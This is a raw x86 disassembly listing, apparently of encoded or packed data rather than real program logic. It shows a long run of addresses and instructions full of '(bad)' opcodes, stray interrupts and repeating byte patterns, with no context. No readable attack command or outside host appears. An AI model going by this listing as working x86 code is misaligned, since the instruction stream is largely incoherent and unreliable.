  4243f3:	ror    DWORD PTR [edx],cl
  4243f5:	jbe    0x4243e4
  4243f7:	int    0x76
  4243f9:	std    
  4243fa:	int    0x8d
  4243fc:	std    
  4243fd:	cmp    edi,DWORD PTR [ecx+0x3b]
  424400:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424407:	push   ebx
  424408:	ror    DWORD PTR [edx],cl
  42440a:	jbe    0x424401
  42440c:	int    0x8d
  42440e:	std    
  42440f:	int    0x76
  424411:	std    
  424412:	cmp    ecx,DWORD PTR [edi]
  424414:	cmp    ecx,ecx
  424416:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  42441c:	push   ebx
  42441d:	jge    0x4243ec
  42441f:	jbe    0x4243b6
  424421:	inc    ebx
  424422:	jge    0x4243f8
  424424:	xchg   ch,cl
  424426:	test   BYTE PTR ds:0xcded760a,bl
  42442c:	jbe    0x4243db
  42442e:	int    0x84
  424430:	sbb    eax,0xcdf5760a
  424435:	jbe    0x424434
  424437:	int    0x8d
  424439:	std    
  42443a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42443d:	lock shl edx,cl
  424440:	sub    bl,dl
  424442:	mov    ebp,0xcdd35392
  424447:	(bad)  
  424448:	in     eax,dx
  424449:	inc    ebx
  42444a:	rcl    esp,cl
  42444c:	push   esp
  42444d:	int    0x76
  42444f:	std    
  424450:	int    0x8d
  424452:	std    
  424453:	cmp    esi,eax
  424455:	cmp    edi,DWORD PTR [ecx-0x2d]
  424458:	repnz sub bl,dl
  42445b:	mov    ebp,0xcdd35392
  424460:	(bad)  
  424461:	in     eax,dx
  424462:	shr    ebx,cl
  424464:	sub    al,BYTE PTR [ebx-0x2d]
  424467:	aam    0x1c
  424469:	int    0x8d
  42446b:	in     eax,dx
  42446c:	int    0x76
  42446e:	dec    esp
  42446f:	int    0x1
  424471:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424477:	retf   
  424478:	jno    0x42447a
  42447a:	(bad)  
  42447b:	mov    ch,0x0
  42447d:	jo     0x424407
  42447f:	in     al,dx
  424480:	push   ds
  424481:	int    0x76
  424483:	cmc    
  424484:	xchg   DWORD PTR [esi-0x78],esi
  424487:	int    0x8d
  424489:	dec    esp
  42448a:	int    0xa
  42448c:	adc    DWORD PTR [ecx+0x6d048080],eax
  424492:	xchg   edx,eax
  424493:	jo     0x424495
  424495:	(bad)  
  424496:	mov    ch,0x0
  424498:	jno    0x424422
  42449a:	or     dh,BYTE PTR [esi-0xb]
  42449d:	int    0x76
  42449f:	std    
  4244a0:	int    0x8d
  4244a2:	std    
  4244a3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244a6:	lock shl edx,cl
  4244a9:	sub    bl,dl
  4244ab:	mov    ebp,0xcdd35392
  4244b0:	(bad)  
  4244b1:	cmc    
  4244b2:	inc    ebx
  4244b3:	ror    ebp,cl
  4244b5:	jbe    0x4244b0
  4244b7:	int    0x8d
  4244b9:	stc    
  4244ba:	(bad)  
  4244bb:	xor    DWORD PTR [ebx],edi
  4244bd:	jns    0x4244fa
  4244bf:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244c6:	push   ebx
  4244c7:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  4244cd:	cmp    esi,eax
  4244cf:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244d2:	repnz sub bl,dl
  4244d5:	mov    ebp,0xcdd35392
  4244da:	(bad)  
  4244db:	cmc    
  4244dc:	das    
  4244dd:	rcl    ebx,1
  4244df:	int    0x8d
  4244e1:	lods   eax,DWORD PTR ds:[esi]
  4244e2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244e9:	(bad)  
  4244ea:	stc    
  4244eb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244ee:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244f5:	push   ebx
  4244f6:	rol    DWORD PTR [edi-0x2893263],cl
  4244fc:	int    0x8d
  4244fe:	std    
  4244ff:	cmp    esi,eax
  424501:	cmp    edi,DWORD PTR [ecx-0x2d]
  424504:	repnz sub bl,dl
  424507:	mov    ebp,0xcdd35392
  42450c:	lea    ebp,[ebp+0x2f1f845e]
  424512:	push   es
  424513:	or     al,0xff
  424515:	add    BYTE PTR [eax],al
  424517:	int    0x76
  424519:	adc    ebp,ecx
  42451b:	lea    edx,[ecx]
  42451d:	ins    BYTE PTR es:[edi],dx
  42451e:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424524:	test   BYTE PTR [eax-0x2cac7f80],al
  42452a:	int    0x8d
  42452c:	icebp  
  42452d:	push   esi
  42452e:	dec    ecx
  42452f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424535:	add    BYTE PTR [eax],al
  424537:	int    0x76
  424539:	std    
  42453a:	int    0x8d
  42453c:	std    
  42453d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424540:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424547:	push   ebx
  424548:	rcr    DWORD PTR [esi+0x76],cl
  42454b:	mov    ebp,0x76cd88d6
  424550:	stc    
  424551:	int    0x8d
  424553:	stc    
  424554:	in     al,dx
  424555:	xchg   ch,cl
  424557:	jbe    0x424556
  424559:	int    0x8d
  42455b:	std    
  42455c:	cmp    esi,eax
  42455e:	cmp    edi,DWORD PTR [ecx-0x56]
  424561:	shl    edx,cl
  424563:	sub    bl,dl
  424565:	mov    ebp,0xd353a892
  42456a:	arpl   bx,cx
  42456c:	ror    BYTE PTR [eax-0x12326980],cl
  424572:	add    al,0xed
  424574:	xor    al,0xc9
  424576:	jbe    0x424575
  424578:	dec    ecx
  424579:	and    DWORD PTR [esi-0x528936cb],eax
  42457f:	inc    ecx
  424580:	and    DWORD PTR [esi+0x4c76cd35],eax
  424586:	or     dh,BYTE PTR [esi+0x4c]
  424589:	cwde   
  42458a:	int    0x6d
  42458c:	int    0x76
  42458e:	std    
  42458f:	int    0x96
  424591:	std    
  424592:	sar    bh,0x5f
  424595:	shl    DWORD PTR [ecx],1
  424597:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  42459d:	cdq    
  42459e:	shr    edx,cl
  4245a0:	sub    bl,dl
  4245a2:	mov    ebp,0xcdd25392
  4245a7:	xchg   esi,eax
  4245a8:	mov    BYTE PTR [ebx-0xf],al
  4245ab:	das    
  4245ac:	add    eax,0x80808159
  4245b1:	int    0x76
  4245b3:	mov    ch,cl
  4245b5:	xchg   esi,eax
  4245b6:	mov    BYTE PTR [edi+0xa9a6470],al
  4245bc:	xchg   esi,eax
  4245bd:	cmc    
  4245be:	leave  
  4245bf:	jbe    0x4245ba
  4245c1:	popa   
  4245c2:	and    DWORD PTR [esi-0x68932cb],eax
  4245c8:	int    0x96
  4245ca:	stc    
  4245cb:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  4245d1:	rcl    ebx,cl
  4245d3:	mov    ebp,0xcdd25392
  4245d8:	xchg   esi,eax
  4245d9:	std    
  4245da:	int    0xe6
  4245dc:	std    
  4245dd:	cmp    esp,ebx
  4245df:	cmp    edi,edi
  4245e1:	shr    ecx,cl
  4245e3:	sub    bl,dl
  4245e5:	repz xchg edx,eax
  4245e7:	push   ebx
  4245e8:	fxch   st(5)
  4245ea:	out    0xf5,al
  4245ec:	pop    esi
  4245ed:	xchg   esp,eax
  4245ee:	leave  
  4245ef:	fsubr  QWORD PTR [edi]
  4245f1:	add    eax,0x8080816b
  4245f6:	int    0x96
  4245f8:	cmc    
  4245f9:	int    0x76
  4245fb:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  424601:	or     ch,0x96
  424604:	mov    ch,cl
  424606:	out    0xf5,al
  424608:	xor    ebx,DWORD PTR [edx-0x21932ac]
  42460e:	pop    ebx
  42460f:	int    0xa6
  424611:	std    
  424612:	cmp    edi,edx
  424614:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  42461a:	in     eax,0x28
  42461c:	push   ebx
  42461d:	cld    
  42461e:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424624:	add    eax,0x8080814f
  424629:	int    0x96
  42462b:	std    
  42462c:	int    0xe6
  42462e:	std    
  42462f:	cmp    esp,ebx
  424631:	cmp    edi,edi
  424633:	shl    ebx,cl
  424635:	xchg   edx,eax
  424636:	shr    ecx,cl
  424638:	sub    BYTE PTR [ebx-0x27],dl
  42463b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424641:	mov    dl,0x21
  424643:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424649:	out    0xfd,al
  42464b:	cmp    esp,ebx
  42464d:	cmp    edi,edi
  42464f:	shl    ebx,cl
  424651:	xchg   edx,eax
  424652:	shr    ecx,cl
  424654:	sub    BYTE PTR [ebx-0x27],dl
  424657:	jmp    0x42465b
  424659:	add    BYTE PTR [eax-0x2693280],0xcd
  424660:	(bad)  
  424661:	std    
  424662:	add    al,0xf7
  424664:	(bad)  
  424665:	cmp    esp,ebx
  424667:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42466d:	push   ebx
  42466e:	cdq    
  42466f:	iret   
  424670:	ja     0x42466b
  424672:	jecxz  0x424663
  424674:	inc    ebx
  424675:	cdq    
  424676:	das    
  424677:	add    al,0x21
  424679:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424680:	jo     0x42460a
  424682:	or     dl,dh
  424684:	mov    ch,0x2f
  424686:	mov    ebx,0xea121a
  42468b:	das    
  42468c:	add    BYTE PTR [eax-0x321269f6],0x96
  424693:	in     eax,dx
  424694:	xchg   DWORD PTR [eax],esi
  424696:	int    0xd6
  424698:	in     eax,dx
  424699:	xchg   DWORD PTR [eax-0x2d],edx
  42469c:	repz sub bl,dl
  42469f:	mov    ecx,0x2ffb5392
  4246a4:	mov    ebx,0x4cf3d31a
  4246a9:	adc    dh,bh
  4246ab:	dec    ecx
  4246ac:	and    DWORD PTR [esi-0x1229f5cb],eax
  4246b2:	or     dl,BYTE PTR [esi-0x12693243]
  4246b8:	int    0xd6
  4246ba:	in     eax,dx
  4246bb:	cmp    esp,ebx
  4246bd:	add    al,0xf7
  4246bf:	call   ebx
  4246c1:	repz xchg edx,eax
  4246c3:	sar    DWORD PTR [ecx-0x7866acd8],cl
  4246c9:	xchg   esi,eax
  4246ca:	mov    BYTE PTR [edx],cl
  4246cc:	xchg   esi,eax
  4246cd:	in     eax,dx
  4246ce:	int    0x96
  4246d0:	dec    esp
  4246d1:	int    0xd6
  4246d3:	dec    esp
  4246d4:	cmp    esp,ebx
  4246d6:	add    al,0xf7
  4246d8:	call   ebx
  4246da:	mov    ecx,0x92f3d328
  4246df:	push   ebx
  4246e0:	cdq    
  4246e1:	int    0xd6
  4246e3:	mov    ebp,0x32d6fb43
  4246e8:	int    0x96
  4246ea:	dec    esp
  4246eb:	int    0xd6
  4246ed:	dec    esp
  4246ee:	cmp    esp,ebx
  4246f0:	add    al,0xf7
  4246f2:	call   ebx
  4246f4:	mov    ecx,0x92f3d328
  4246f9:	push   ebx
  4246fa:	cdq    
  4246fb:	int    0xd6
  4246fd:	mov    ebp,0x88d6fb43
  424702:	int    0x96
  424704:	in     eax,dx
  424705:	int    0xd6
  424707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424708:	add    DWORD PTR [edx+0x4],0x8d0092c9
  42470f:	mov    ch,0x2f
  424711:	push   es
  424712:	xchg   ebx,eax
  424713:	add    BYTE PTR [eax],al
  424715:	add    BYTE PTR [ecx-0x6932ee5a],al
  42471b:	stc    
  42471c:	int    0xd6
  42471e:	stc    
  42471f:	cmp    esp,ebx
  424721:	add    al,0xf7
  424723:	call   ebx
  424725:	mov    ecx,0x92f3d328
  42472a:	push   ebx
  42472b:	cdq    
  42472c:	int    0xd6
  42472e:	adc    ebp,ecx
  424730:	out    0xf5,al
  424732:	inc    ebx
  424733:	aam    0xd9
  424735:	in     al,0x77
  424737:	sub    al,0xcd
  424739:	xchg   esi,eax
  42473a:	std    
  42473b:	int    0xd6
  42473d:	std    
  42473e:	cmp    esp,ebx
  424740:	add    al,0xf7
  424742:	call   ebx
  424744:	repz xchg edx,eax
  424746:	sar    DWORD PTR [ecx+0x53c58728],cl
  42474c:	cdq    
  42474d:	int    0x9c
  42474f:	test   BYTE PTR [ebx-0x1e],al
  424752:	das    
  424753:	push   es
  424754:	test   BYTE PTR [eax],al
  424756:	add    BYTE PTR [eax],al
  424758:	arpl   bp,cx
  42475a:	jbe    0x424709
  42475c:	cmp    edx,ebx
  42475e:	int    0x8d
  424760:	lods   eax,DWORD PTR ds:[esi]
  424761:	add    al,0x2
  424763:	jmp    FWORD PTR [edx+0x76cd4aec]
  424769:	std    
  42476a:	cmp    edx,ebx
  42476c:	int    0x8d
  42476e:	std    
  42476f:	cmp    ecx,DWORD PTR [edi]
  424771:	shl    edx,cl
  424773:	sub    bl,dl
  424775:	mov    ebp,0xa8d35392
  42477a:	retf   
  42477b:	ror    BYTE PTR [eax-0x12326980],cl
  424781:	adc    ch,ch
  424783:	xchg   ebp,eax
  424784:	add    BYTE PTR [eax-0x2893680],0x49
  42478b:	and    DWORD PTR [esi-0x68936cb],eax
  424791:	inc    ecx
  424792:	and    DWORD PTR [esi-0x28932cb],eax
  424798:	int    0x8d
  42479a:	std    
  42479b:	cwde   
  42479c:	call   0x8621:0xd169ffc0
  4247a3:	xor    eax,0xbdd3793b
  4247a8:	xchg   edx,eax
  4247a9:	mov    al,ds:0xf2d3133b
  4247ae:	sub    BYTE PTR [ebx-0x2d],dl
  4247b1:	or     dh,BYTE PTR [esi-0x53]
  4247b4:	int    0x76
  4247b6:	std    
  4247b7:	int    0x8d
  4247b9:	std    
  4247ba:	cmp    edi,DWORD PTR [ecx-0x2d]
  4247bd:	mov    ebp,0xd3133b92
  4247c2:	repnz sub BYTE PTR [ebx-0x2d],dl
  4247c6:	or     dh,BYTE PTR [esi-0xf]
  4247c9:	int    0xe6
  4247cb:	and    al,0xcd
  4247cd:	jbe    0x4247bc
  4247cf:	int    0x8d
  4247d1:	in     eax,dx
  4247d2:	cmp    edx,ebx
  4247d4:	or     dh,BYTE PTR [esi-0x13]
  4247d7:	adc    dh,BYTE PTR [esi-0x13]
  4247da:	dec    ecx
  4247db:	mov    al,ds:0x76cd3586
  4247e0:	cmc    
  4247e1:	int    0x8d
  4247e3:	cmc    
  4247e4:	cmp    edx,ebx
  4247e6:	or     dh,BYTE PTR [esi-0xb]
  4247e9:	adc    dh,BYTE PTR [esi-0xb]
  4247ec:	dec    ecx
  4247ed:	lahf   
  4247ee:	xchg   BYTE PTR ds:0xcd1176cd,dh
  4247f4:	lea    edx,[ecx]
  4247f6:	cmp    edx,ebx
  4247f8:	or     dh,BYTE PTR [esi+0x11]
  4247fb:	adc    dh,BYTE PTR [esi+0x11]
  4247fe:	imul   esp,DWORD PTR [ecx],0x76cd3586
  424804:	mov    ch,0xcd
  424806:	lea    esi,[ebp+0x760ad33b]
  42480c:	mov    ch,0x12
  42480e:	jbe    0x4247c5
  424810:	dec    ecx
  424811:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  424818:	hlt    
  424819:	mov    esi,DWORD PTR ds:0x68876cd
  42481f:	ins    DWORD PTR es:[edi],dx
  424820:	das    
  424821:	add    eax,0x80808551
  424826:	int    0x76
  424828:	dec    esp
  424829:	push   es
  42482a:	ins    DWORD PTR es:[edi],dx
  42482b:	das    
  42482c:	add    eax,0x80808538
  424831:	int    0x76
  424833:	sbb    al,0x6
  424835:	ins    DWORD PTR es:[edi],dx
  424836:	das    
  424837:	add    eax,0x80808523
  42483c:	int    0x76
  42483e:	and    al,0xcd
  424840:	jbe    0x424866
  424842:	int    0x8d
  424844:	mov    bl,dl
  424846:	mov    ebp,0x39af5692
  42484b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424852:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42485c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42485f:	mov    ebp,0xd3133b92
  424864:	repnz sub BYTE PTR [ebx-0x2d],dl
  424868:	or     dh,BYTE PTR [esi-0xf]
  42486b:	int    0x76
  42486d:	std    
  42486e:	int    0x76
  424870:	std    
  424871:	int    0x76
  424873:	mov    ch,cl
  424875:	lea    ecx,[eax-0x329b8379]
  42487b:	outs   dx,BYTE PTR ds:[esi]
  42487c:	jo     0x424888
  42487e:	lea    esp,[esi+eax*1]
  424881:	ins    DWORD PTR es:[edi],dx
  424882:	das    
  424883:	add    eax,0x808084f0
  424888:	leave  
  424889:	jbe    0x424820
  42488b:	dec    ecx
  42488c:	and    DWORD PTR [eax+0x35],edi
  42488f:	int    0x76
  424891:	xchg   ebp,eax
  424892:	pop    ebx
  424893:	int    0xa6
  424895:	xchg   ebp,eax
  424896:	cmp    edi,DWORD PTR [ecx+0x3b]
  424899:	loop   0x42486e
  42489b:	mov    ebp,0x28e5d392
  4248a0:	push   ebx
  4248a1:	popf   
  4248a2:	or     ah,BYTE PTR [esi-0x289326b]
  4248a8:	int    0x76
  4248aa:	std    
  4248ab:	int    0x8
  4248ad:	sub    eax,0xcd808081
  4248b2:	xor    ch,cl
  4248b4:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  4248b8:	int    0x76
  4248ba:	std    
  4248bb:	int    0x76
  4248bd:	std    
  4248be:	int    0x8
  4248c0:	and    eax,0xcd808081
  4248c5:	sbb    al,0xa
  4248c7:	xchg   esi,eax
  4248c8:	dec    esp
  4248c9:	inc    ebx
  4248ca:	fst    st(6)
  4248cc:	push   0xffffffcd
  4248ce:	(bad)  
  4248cf:	cmc    
  4248d0:	int    0x8
  4248d2:	adc    DWORD PTR [ecx-0x69307f80],eax
  4248d8:	lods   eax,DWORD PTR ds:[esi]
  4248d9:	(bad)  
  4248da:	int    0x96
  4248dc:	cmc    
  4248dd:	cmp    ecx,DWORD PTR [edi]
  4248df:	add    al,0xfb
  4248e1:	call   ebx
  4248e3:	jmp    0x424877
  4248e5:	shr    edx,cl
  4248e7:	sub    BYTE PTR [ebx-0x1d],dl
  4248ea:	int    0x8d
  4248ec:	dec    esp
  4248ed:	bound  eax,QWORD PTR [eax]
  4248ef:	xchg   ecx,eax
  4248f0:	jo     0x42494d
  4248f2:	add    BYTE PTR [eax+0x24],dh
  4248f5:	int    0x8d
  4248f7:	dec    esp
  4248f8:	int    0x6e
  4248fa:	xchg   esp,eax
  4248fb:	int    0x7e
  4248fd:	jo     0x424932
  4248ff:	jge    0x424972
  424901:	xchg   ebp,eax
  424903:	jo     0x4248c2
  424905:	dec    esi
  424906:	xchg   BYTE PTR [eax+0x248dcd80],al
  42490c:	int    0x8
  42490e:	xor    eax,0xa808081
  424913:	sbb    al,0x0
  424915:	xchg   ecx,eax
  424916:	xchg   esp,eax
  424917:	add    dh,dl
  424919:	mov    BYTE PTR [ebx-0x43],bl
  42491c:	or     eax,0xcd808084
  424921:	pop    ebx
  424922:	fs xchg ebp,edx
  424925:	das    
  424926:	mov    ebx,0x74cf1452
  42492b:	xor    BYTE PTR [edx+ecx*1],bl
  42492e:	jbe    0x42494c
  424930:	int    0x76
  424932:	std    
  424933:	int    0x8d
  424935:	std    
  424936:	cmp    edi,DWORD PTR [ecx+0x4]
  424939:	add    bh,bh
  42493b:	shl    edx,cl
  42493d:	sub    bl,dl
  42493f:	mov    ebp,0x2fd35392
  424944:	mov    ebx,0x960a868a
  424949:	and    al,0x43
  42494b:	jge    0x42497c
  42494d:	add    eax,0x808080e9
  424952:	int    0x76
  424954:	std    
  424955:	int    0x8d
  424957:	std    
  424958:	cmp    edi,DWORD PTR [ecx+0x4]
  42495b:	add    bh,bh
  42495d:	shl    edx,cl
  42495f:	sub    bl,dl
  424961:	mov    ebp,0xad35392
  424966:	jbe    0x42490d
  424968:	int    0x76
  42496a:	stc    
  42496b:	int    0x8d
  42496d:	stc    
  42496e:	add    al,0x2
  424970:	(bad)  
  424971:	cmp    edi,DWORD PTR [ecx-0x2d]
  424974:	repnz sub bl,dl
  424977:	mov    ebp,0x2fd35392
  42497c:	mov    ebx,0x7d33868a
  424981:	pop    esi
  424982:	lea    esp,[ebp-0x7f2ef7d1]
  424988:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42498f:	mov    BYTE PTR [edx],cl
  424991:	lea    ebx,[esp+ebp*8]
  424994:	xchg   ebp,ecx
  424996:	lea    ebx,[ecx*8+0x31cd5c52]
  42499d:	or     dh,BYTE PTR [esi-0x63]
  4249a0:	jl     0x4249a8
  4249a2:	icebp  
  4249a3:	aam    0x89
  4249a5:	clc    
  4249a6:	icebp  
  4249a7:	sub    edx,edx
  4249a9:	xchg   DWORD PTR [esi-0x63],esi
  4249ac:	in     al,dx
  4249ad:	xchg   edx,eax
  4249ae:	int    0xd2
  4249b0:	jo     0x42497f
  4249b2:	outs   dx,BYTE PTR ds:[esi]
  4249b3:	test   BYTE PTR [edi+0x63bd70c5],al
  4249b9:	test   DWORD PTR [eax+0x1c76cd80],eax
  4249bf:	int    0x7c
  4249c1:	mov    BYTE PTR [edx],cl
  4249c3:	lea    ebx,[ebp-0x32027233]
  4249c9:	xchg   esi,eax
  4249ca:	std    
  4249cb:	cmp    ecx,DWORD PTR [edi]
  4249cd:	add    al,0xfb
  4249cf:	call   ebx
  4249d1:	jmp    0x424965
  4249d3:	shr    edx,cl
  4249d5:	sub    BYTE PTR [ebx+0x13],dl
  4249d8:	pop    esi
  4249d9:	lea    ebx,[ebp-0x7232e32c]
  4249df:	mov    BYTE PTR [edi-0x29ffb384],al
  4249e5:	popf   
  4249e6:	int    0x6c
  4249e8:	test   BYTE PTR [ecx-0x79],dh
  4249eb:	lds    esi,FWORD PTR [eax-0x43]
  4249ee:	add    eax,DWORD PTR [edi+0x76cd8080]
  4249f4:	sbb    al,0xcd
  4249f6:	(bad)  
  4249f7:	stc    
  4249f8:	int    0x96
  4249fa:	stc    
  4249fb:	cmp    ecx,DWORD PTR [edi]
  4249fd:	shr    ebx,cl
  4249ff:	xchg   edx,eax
  424a00:	add    al,0xfb
  424a02:	inc    DWORD PTR [ebp*2+0x28ead33c]
  424a09:	push   ebx
  424a0a:	adc    eax,DWORD PTR [ecx-0x69325a73]
  424a10:	and    al,0xa
  424a12:	jbe    0x424a30
  424a14:	int    0x76
  424a16:	stc    
  424a17:	int    0x8d
  424a19:	stc    
  424a1a:	add    al,0x2
  424a1c:	(bad)  
  424a1d:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a20:	repnz sub bl,dl
  424a23:	mov    ebp,0xcdd35392
  424a28:	lea    esp,[edi+ebp*1]
  424a2b:	mov    ebx,0x7d33867e
  424a30:	pop    esi
  424a31:	lea    esp,[ebp+0xa4072f]
  424a37:	add    BYTE PTR [eax],al
  424a39:	int    0x8
  424a3b:	and    eax,0x43808081
  424a40:	sbb    al,0xd6
  424a42:	cmp    ecx,ebp
  424a44:	lea    edx,[ecx]
  424a46:	int    0x8
  424a48:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a4e:	lods   eax,DWORD PTR ds:[esi]
  424a4f:	(bad)  
  424a50:	int    0x96
  424a52:	adc    DWORD PTR [ebx],edi
  424a54:	(bad)  
  424a56:	sti    
  424a57:	call   ebx
  424a59:	jmp    0x4249ed
  424a5b:	shr    edx,cl
  424a5d:	sub    BYTE PTR [ebx-0x1d],dl
  424a60:	int    0x8d
  424a62:	dec    esp
  424a63:	bound  eax,QWORD PTR [eax]
  424a65:	xchg   ecx,eax
  424a66:	xchg   esp,eax
  424a67:	pop    ebx
  424a68:	add    BYTE PTR [eax+0x24],dh
  424a6b:	push   es
  424a6c:	ins    DWORD PTR es:[edi],dx
  424a6d:	das    
  424a6e:	add    eax,0x808092d9
  424a73:	int    0x96
  424a75:	and    al,0xcd
  424a77:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a7d:	or     ch,0x7d
  424a80:	cmp    ecx,DWORD PTR [edi]
  424a82:	add    al,0x11
  424a84:	call   ebx
  424a86:	jmp    0x424a1a
  424a88:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a8e:	add    eax,0x808081da
  424a93:	int    0x76
  424a95:	std    
  424a96:	int    0x8d
  424a98:	std    
  424a99:	cmp    edi,DWORD PTR [ecx+0x4]
  424a9c:	add    bh,bh
  424a9e:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424aa4:	push   ebx
  424aa5:	ror    DWORD PTR [edx],cl
  424aa7:	jbe    0x424a66
  424aa9:	pop    ebp
  424aaa:	push   0xcf35869f
  424aaf:	jl     0x424a5e
  424ab1:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424ab7:	leave  
  424ab8:	jbe    0x424aff
  424aba:	sbb    BYTE PTR [edi+0x76c93586],bl
  424ac0:	shr    al,1
  424ac2:	lahf   
  424ac3:	xchg   BYTE PTR ds:0xc955760a,dh
  424ac9:	jbe    0x424b38
  424acb:	dec    ecx
  424acc:	and    DWORD PTR [esi-0x3234c4cb],eax
  424ad2:	xchg   esp,eax
  424ad3:	iret   
  424ad4:	inc    ebp
  424ad5:	shl    ebx,cl
  424ad7:	xchg   edx,eax
  424ad8:	adc    bh,bl
  424ada:	scas   eax,DWORD PTR es:[edi]
  424adb:	cmp    DWORD PTR [eax+0x150ab880],eax
  424ae1:	lea    esi,[eax+eax*1+0x0]
  424ae5:	add    BYTE PTR [esi+0x4],ch
  424ae8:	cli    
  424ae9:	xchg   BYTE PTR [edx-0x6047a019],al
  424aef:	xchg   BYTE PTR ds:0x94060a,dh
  424af5:	add    BYTE PTR [eax],al
  424af7:	or     al,BYTE PTR [esi]
  424af9:	mov    esp,0xa000000
  424afe:	jbe    0x424ab0
  424b00:	or     dh,BYTE PTR [esi+0x15]
  424b03:	iret   
  424b04:	outs   dx,BYTE PTR ds:[esi]
  424b05:	std    
  424b06:	iret   
  424b07:	jno    0x424b79
  424b09:	or     dh,BYTE PTR [esi+0x2d]
  424b0c:	or     dh,BYTE PTR [esi+0x35]
  424b0f:	leave  
  424b10:	push   es
  424b11:	jo     0x424b13
  424b13:	add    BYTE PTR [eax],al
  424b15:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424b1b:	pushf  
  424b1c:	add    BYTE PTR [eax],al
  424b1e:	add    BYTE PTR [edx],cl
  424b20:	pop    ss
  424b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b22:	add    BYTE PTR [eax],al
  424b24:	add    cl,cl
  424b26:	push   es
  424b27:	lods   al,BYTE PTR ds:[esi]
  424b28:	add    BYTE PTR [eax],al
  424b2a:	add    BYTE PTR [edx-0x61],cl
  424b2d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b33:	add    BYTE PTR [eax],al
  424b35:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b3b:	les    eax,FWORD PTR [eax]
  424b3d:	add    BYTE PTR [eax],al
  424b3f:	popa   
  424b40:	lahf   
  424b41:	xchg   BYTE PTR ds:0x9006c9,dh
  424b47:	add    BYTE PTR [eax],al
  424b49:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b4f:	aam    0x0
  424b51:	add    BYTE PTR [eax],al
  424b53:	call   0xa77d1f7
  424b58:	iret   
  424b59:	fadd   QWORD PTR [eax]
  424b5b:	add    BYTE PTR [eax],al
  424b5d:	leave  
  424b5e:	push   es
  424b5f:	in     al,0x0
  424b61:	add    BYTE PTR [eax],al
  424b63:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b69:	add    ecx,ecx
  424b6b:	jbe    0x424b72
  424b6d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b73:	or     ecx,ecx
  424b75:	jbe    0x424b43
  424b77:	inc    ecx
  424b78:	lahf   
  424b79:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b7f:	jbe    0x424ba6
  424b81:	pusha  
  424b82:	lahf   
  424b83:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b89:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b8f:	int3   
  424b90:	push   es
  424b91:	jo     0x424b93
  424b93:	add    BYTE PTR [eax],al
  424b95:	shr    ebx,cl
  424b97:	xchg   edx,eax
  424b98:	add    DWORD PTR [edx],eax
  424b9a:	scas   eax,DWORD PTR es:[edi]
  424b9b:	or     esp,ecx
  424b9d:	test   DWORD PTR [eax+eax*1+0x0],eax
  424ba1:	add    BYTE PTR [esp+eax*1-0x7],ch
  424ba5:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424bab:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424bb5:	add    BYTE PTR [eax-0x7c],dh
  424bb8:	int    0xb3
  424bba:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424bc0:	inc    esp
  424bc1:	add    BYTE PTR [eax],al
  424bc3:	add    BYTE PTR [edx+0x70],ah
  424bc6:	add    BYTE PTR [ecx-0x78],dh
  424bc9:	or     dh,BYTE PTR [esi+0x7d]
  424bcc:	iret   
  424bcd:	jbe    0x424b8c
  424bcf:	jo     0x424b9e
  424bd1:	or     BYTE PTR ds:0x808081,ah
  424bd7:	push   eax
  424bd8:	int    0x76
  424bda:	jge    0x424bdc
  424bdc:	icebp  
  424bdd:	int    0x76
  424bdf:	std    
  424be0:	int    0x8d
  424be2:	std    
  424be3:	cmp    edi,DWORD PTR [ecx+0x4]
  424be6:	add    bh,bh
  424be8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bee:	push   ebx
  424bef:	ror    DWORD PTR [edx],cl
  424bf1:	jbe    0x424c00
  424bf3:	int    0x8d
  424bf5:	std    
  424bf6:	int    0x76
  424bf8:	std    
  424bf9:	cmp    ecx,DWORD PTR [edi]
  424bfb:	add    al,0x11
  424bfd:	call   ebx
  424bff:	lods   eax,DWORD PTR ds:[esi]
  424c00:	sub    bl,dl
  424c02:	jmp    0x424b96
